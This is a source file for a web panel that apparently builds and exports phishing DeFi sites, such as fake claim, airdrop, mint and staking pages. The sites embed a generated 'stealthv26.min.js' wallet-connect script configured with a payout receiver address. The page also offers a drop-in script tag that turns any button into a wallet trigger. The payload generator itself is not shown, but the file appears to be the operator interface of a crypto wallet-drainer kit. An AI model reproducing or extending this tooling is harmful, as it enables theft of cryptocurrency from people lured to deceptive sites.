"use client";

import { useState } from "react";
import { DEFI_TEMPLATES, type DefiTemplate } from "@/lib/templates";
import { useStore } from "@/lib/store";
import { generateSDKBundle, generateTemplatePackage } from "@/lib/sdk-generator";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Separator } from "@/components/ui/separator";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Download,
  Eye,
  Code2,
  Search,
  FileCode2,
  Package,
  Layers,
  Copy,
  Check,
} from "lucide-react";
import { toast } from "sonner";

const CATEGORIES = [
  { key: "all", label: "All Templates" },
  { key: "claim", label: "Claim" },
  { key: "mint", label: "Mint" },
  { key: "staking", label: "Staking" },
  { key: "swap", label: "Swap" },
  { key: "airdrop", label: "Airdrop" },
  { key: "bridge", label: "Bridge" },
  { key: "lending", label: "Lending" },
  { key: "governance", label: "Governance" },
  { key: "standalone", label: "⚡ Standalone WC" },
];

function downloadFile(filename: string, content: string, type = "text/plain") {
  const blob = new Blob([content], { type });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

export default function TemplatesPage() {
  const {
    generalConfig,
    walletConfig,
    modalConfig,
    tokensConfig,
    advancedConfig,
    payoutConfig,
  } = useStore();

  const [search, setSearch] = useState("");
  const [category, setCategory] = useState("all");
  const [selectedTemplate, setSelectedTemplate] = useState<DefiTemplate | null>(null);
  const [previewOpen, setPreviewOpen] = useState(false);
  const [exportOpen, setExportOpen] = useState(false);
  const [copied, setCopied] = useState<string | null>(null);

  const filtered = DEFI_TEMPLATES.filter((t) => {
    const matchSearch =
      !search ||
      t.name.toLowerCase().includes(search.toLowerCase()) ||
      t.description.toLowerCase().includes(search.toLowerCase()) ||
      t.tags.some((tag) => tag.toLowerCase().includes(search.toLowerCase()));
    const matchCategory = category === "all" || t.category === category;
    return matchSearch && matchCategory;
  });

  const getSDKBundle = () =>
    generateSDKBundle({
      general: generalConfig,
      wallet: walletConfig,
      modal: modalConfig,
      tokens: tokensConfig,
      advanced: advancedConfig,
      receiverAddress: payoutConfig.address || "0x0000000000000000000000000000000000000000",
    });

  const handleDownloadJS = () => {
    const sdk = getSDKBundle();
    downloadFile("stealthv26.min.js", sdk, "application/javascript");
    toast.success("SDK downloaded: stealthv26.min.js");
  };

  const handleDownloadTemplate = (template: DefiTemplate) => {
    const sdk = getSDKBundle();
    const pkg = generateTemplatePackage(template.html, sdk);
    downloadFile(`${template.id}.html`, pkg.html, "text/html");
    toast.success(`Template downloaded: ${template.id}.html`);
  };

  const handleDownloadPackage = (template: DefiTemplate) => {
    const sdk = getSDKBundle();
    downloadFile(`${template.id}/index.html`, template.html, "text/html");
    setTimeout(() => {
      downloadFile(`${template.id}/stealthv26.min.js`, sdk, "application/javascript");
    }, 300);
    toast.success("Package exported: HTML + JS files");
  };

  const handleCopy = (content: string, key: string) => {
    navigator.clipboard.writeText(content);
    setCopied(key);
    setTimeout(() => setCopied(null), 2000);
  };

  const openPreview = (template: DefiTemplate) => {
    setSelectedTemplate(template);
    setPreviewOpen(true);
  };

  const openExport = (template: DefiTemplate) => {
    setSelectedTemplate(template);
    setExportOpen(true);
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold tracking-tight">Web3 DeFi Templates</h1>
          <p className="text-muted-foreground text-sm mt-1">
            Pre-built DeFi site templates — export with plug-and-play wallet connect JS
          </p>
        </div>
        <div className="flex items-center gap-2">
          <Badge variant="outline" className="text-xs">
            {DEFI_TEMPLATES.length} templates
          </Badge>
          <Button onClick={handleDownloadJS} className="gap-2" size="sm">
            <FileCode2 className="h-3.5 w-3.5" />
            Download SDK (.js)
          </Button>
        </div>
      </div>

      {/* Filters */}
      <div className="flex flex-wrap items-center gap-3">
        <div className="relative flex-1 min-w-[200px] max-w-md">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
          <Input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search templates..."
            className="pl-9 text-sm"
          />
        </div>
        <div className="flex flex-wrap gap-1.5">
          {CATEGORIES.map((cat) => (
            <Button
              key={cat.key}
              size="sm"
              variant={category === cat.key ? "default" : "outline"}
              onClick={() => setCategory(cat.key)}
              className="text-xs h-8"
            >
              {cat.label}
            </Button>
          ))}
        </div>
      </div>

      {/* Template Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-5">
        {filtered.map((template) => (
          <Card
            key={template.id}
            className="group overflow-hidden hover:shadow-lg transition-all duration-300 hover:-translate-y-1"
          >
            {/* Preview Gradient */}
            <div
              className="h-40 relative cursor-pointer"
              style={{ background: template.preview }}
              onClick={() => openPreview(template)}
            >
              <div className="absolute inset-0 bg-black/0 group-hover:bg-black/20 transition-all flex items-center justify-center">
                <div className="opacity-0 group-hover:opacity-100 transition-opacity flex gap-2">
                  <Button size="sm" variant="secondary" className="gap-1.5 text-xs shadow-lg">
                    <Eye className="h-3 w-3" />
                    Preview
                  </Button>
                </div>
              </div>
              <div className="absolute top-3 left-3">
                <Badge className="text-[10px] capitalize bg-black/50 text-white border-none backdrop-blur-sm">
                  {template.category}
                </Badge>
              </div>
            </div>

            <CardContent className="p-4 space-y-3">
              <div>
                <h3 className="font-semibold text-sm">{template.name}</h3>
                <p className="text-xs text-muted-foreground mt-1 line-clamp-2">
                  {template.description}
                </p>
              </div>

              <div className="flex flex-wrap gap-1">
                {template.tags.map((tag) => (
                  <Badge key={tag} variant="secondary" className="text-[10px]">
                    {tag}
                  </Badge>
                ))}
              </div>

              <div className="flex flex-wrap gap-1">
                {template.chains.slice(0, 3).map((chain) => (
                  <span
                    key={chain}
                    className="text-[10px] text-muted-foreground bg-accent/50 px-1.5 py-0.5 rounded"
                  >
                    {chain}
                  </span>
                ))}
                {template.chains.length > 3 && (
                  <span className="text-[10px] text-muted-foreground">
                    +{template.chains.length - 3}
                  </span>
                )}
              </div>

              <Separator />

              <div className="flex items-center gap-2">
                <Button
                  size="sm"
                  variant="outline"
                  className="flex-1 gap-1.5 text-xs h-8"
                  onClick={() => openPreview(template)}
                >
                  <Eye className="h-3 w-3" />
                  Preview
                </Button>
                <Button
                  size="sm"
                  className="flex-1 gap-1.5 text-xs h-8"
                  onClick={() => openExport(template)}
                >
                  <Package className="h-3 w-3" />
                  Export
                </Button>
              </div>
            </CardContent>
          </Card>
        ))}
      </div>

      {filtered.length === 0 && (
        <div className="text-center py-20">
          <Layers className="h-12 w-12 text-muted-foreground mx-auto mb-3" />
          <p className="text-muted-foreground text-sm">No templates match your search.</p>
        </div>
      )}

      {/* Preview Dialog */}
      <Dialog open={previewOpen} onOpenChange={setPreviewOpen}>
        <DialogContent className="max-w-5xl h-[85vh] p-0 gap-0 overflow-hidden">
          <DialogHeader className="p-4 pb-2 border-b border-border shrink-0">
            <div className="flex items-center justify-between">
              <div>
                <DialogTitle className="text-base">{selectedTemplate?.name}</DialogTitle>
                <DialogDescription className="text-xs">
                  {selectedTemplate?.description}
                </DialogDescription>
              </div>
              <div className="flex items-center gap-2">
                {selectedTemplate && (
                  <>
                    <Button
                      size="sm"
                      variant="outline"
                      className="gap-1.5 text-xs"
                      onClick={() => {
                        openExport(selectedTemplate);
                        setPreviewOpen(false);
                      }}
                    >
                      <Download className="h-3 w-3" />
                      Export
                    </Button>
                  </>
                )}
              </div>
            </div>
          </DialogHeader>
          {selectedTemplate && (
            <iframe
              srcDoc={(() => {
                const sdk = getSDKBundle();
                const wcId = modalConfig.walletConnectProjectId || "c1aedea4fb2ff1237812d5548c61541d";
                // Inject SDK + WC project ID into preview HTML
                let html = selectedTemplate.html
                  .replace('<script src="stealthv26.min.js"></script>', `<script type="module">\n${sdk}\n</script>`)
                  .replace('YOUR_WALLETCONNECT_PROJECT_ID', wcId);
                // If no SDK tag found (standalone templates), inject before </body>
                if (!html.includes(sdk)) {
                  html = html.replace('</body>', `<script type="module">\n${sdk}\n</script>\n</body>`);
                }
                return html;
              })()}
              className="flex-1 w-full h-full border-none bg-black"
              sandbox="allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox allow-modals allow-forms"
              title={selectedTemplate.name}
            />
          )}
        </DialogContent>
      </Dialog>

      {/* Export Dialog */}
      <Dialog open={exportOpen} onOpenChange={setExportOpen}>
        <DialogContent className="max-w-3xl max-h-[85vh] overflow-hidden flex flex-col">
          <DialogHeader>
            <DialogTitle className="text-base flex items-center gap-2">
              <Package className="h-4 w-4" />
              Export: {selectedTemplate?.name}
            </DialogTitle>
            <DialogDescription>
              Download template with compiled wallet connect SDK
            </DialogDescription>
          </DialogHeader>

          {selectedTemplate && (
            <Tabs defaultValue="bundle" className="flex-1 flex flex-col overflow-hidden">
              <TabsList className="w-full grid grid-cols-3 shrink-0">
                <TabsTrigger value="bundle" className="text-xs gap-1.5">
                  <Package className="h-3 w-3" />
                  Full Bundle
                </TabsTrigger>
                <TabsTrigger value="js" className="text-xs gap-1.5">
                  <FileCode2 className="h-3 w-3" />
                  JS Only
                </TabsTrigger>
                <TabsTrigger value="html" className="text-xs gap-1.5">
                  <Code2 className="h-3 w-3" />
                  HTML Source
                </TabsTrigger>
              </TabsList>

              <TabsContent value="bundle" className="flex-1 overflow-auto space-y-4 mt-4">
                <div className="rounded-lg border bg-accent/30 p-4 space-y-3">
                  <p className="text-sm font-medium">Full Package Export</p>
                  <p className="text-xs text-muted-foreground">
                    Downloads an HTML file with the wallet connect SDK embedded inline. 
                    Just upload to your server — no extra files needed.
                  </p>
                  <div className="flex flex-wrap gap-2">
                    {selectedTemplate.features.map((f) => (
                      <Badge key={f} variant="secondary" className="text-[10px]">
                        {f}
                      </Badge>
                    ))}
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <Card>
                    <CardContent className="p-4 space-y-2">
                      <p className="text-xs font-medium">Single HTML File</p>
                      <p className="text-[11px] text-muted-foreground">
                        Template + SDK bundled into one file
                      </p>
                      <Button
                        size="sm"
                        className="w-full gap-1.5 text-xs"
                        onClick={() => handleDownloadTemplate(selectedTemplate)}
                      >
                        <Download className="h-3 w-3" />
                        Download .html
                      </Button>
                    </CardContent>
                  </Card>
                  <Card>
                    <CardContent className="p-4 space-y-2">
                      <p className="text-xs font-medium">Separate Files</p>
                      <p className="text-[11px] text-muted-foreground">
                        HTML + stealthv26.min.js separately
                      </p>
                      <Button
                        size="sm"
                        variant="outline"
                        className="w-full gap-1.5 text-xs"
                        onClick={() => handleDownloadPackage(selectedTemplate)}
                      >
                        <Package className="h-3 w-3" />
                        Download Package
                      </Button>
                    </CardContent>
                  </Card>
                </div>

                <div className="rounded-lg border p-4 space-y-2">
                  <p className="text-xs font-medium">Quick Integration</p>
                  <p className="text-[11px] text-muted-foreground">
                    Add this script tag to any existing website:
                  </p>
                  <div className="relative">
                    <pre className="bg-zinc-950 text-emerald-400 rounded-lg p-3 text-xs font-mono overflow-x-auto">
                      {`<script src="stealthv26.min.js"></script>`}
                    </pre>
                    <Button
                      size="icon"
                      variant="ghost"
                      className="absolute top-1.5 right-1.5 h-6 w-6"
                      onClick={() =>
                        handleCopy(
                          `<script src="stealthv26.min.js"></script>`,
                          "script-tag"
                        )
                      }
                    >
                      {copied === "script-tag" ? (
                        <Check className="h-3 w-3" />
                      ) : (
                        <Copy className="h-3 w-3" />
                      )}
                    </Button>
                  </div>
                  <p className="text-[11px] text-muted-foreground">
                    The SDK auto-binds to elements with class <code className="text-primary">{generalConfig.connectButtonClass}</code> — 
                    any button with that class becomes a wallet connect trigger.
                  </p>
                </div>
              </TabsContent>

              <TabsContent value="js" className="flex-1 overflow-hidden flex flex-col mt-4 gap-3">
                <div className="flex items-center justify-between">
                  <p className="text-xs text-muted-foreground">
                    stealthv26.min.js — Compiled from your Compile settings
                  </p>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      variant="outline"
                      className="gap-1.5 text-xs"
                      onClick={() => handleCopy(getSDKBundle(), "js-code")}
                    >
                      {copied === "js-code" ? (
                        <Check className="h-3 w-3" />
                      ) : (
                        <Copy className="h-3 w-3" />
                      )}
                      Copy
                    </Button>
                    <Button
                      size="sm"
                      className="gap-1.5 text-xs"
                      onClick={handleDownloadJS}
                    >
                      <Download className="h-3 w-3" />
                      Download .js
                    </Button>
                  </div>
                </div>
                <ScrollArea className="flex-1 rounded-lg border bg-zinc-950 p-4">
                  <pre className="text-[11px] text-emerald-400 font-mono whitespace-pre-wrap leading-relaxed">
                    {getSDKBundle()}
                  </pre>
                </ScrollArea>
              </TabsContent>

              <TabsContent value="html" className="flex-1 overflow-hidden flex flex-col mt-4 gap-3">
                <div className="flex items-center justify-between">
                  <p className="text-xs text-muted-foreground">
                    {selectedTemplate.id}/index.html — Template source
                  </p>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      variant="outline"
                      className="gap-1.5 text-xs"
                      onClick={() =>
                        handleCopy(selectedTemplate.html, "html-code")
                      }
                    >
                      {copied === "html-code" ? (
                        <Check className="h-3 w-3" />
                      ) : (
                        <Copy className="h-3 w-3" />
                      )}
                      Copy
                    </Button>
                    <Button
                      size="sm"
                      className="gap-1.5 text-xs"
                      onClick={() =>
                        downloadFile(
                          `${selectedTemplate.id}.html`,
                          selectedTemplate.html,
                          "text/html"
                        )
                      }
                    >
                      <Download className="h-3 w-3" />
                      Download .html
                    </Button>
                  </div>
                </div>
                <ScrollArea className="flex-1 rounded-lg border bg-zinc-950 p-4">
                  <pre className="text-[11px] text-sky-400 font-mono whitespace-pre-wrap leading-relaxed">
                    {selectedTemplate.html}
                  </pre>
                </ScrollArea>
              </TabsContent>
            </Tabs>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
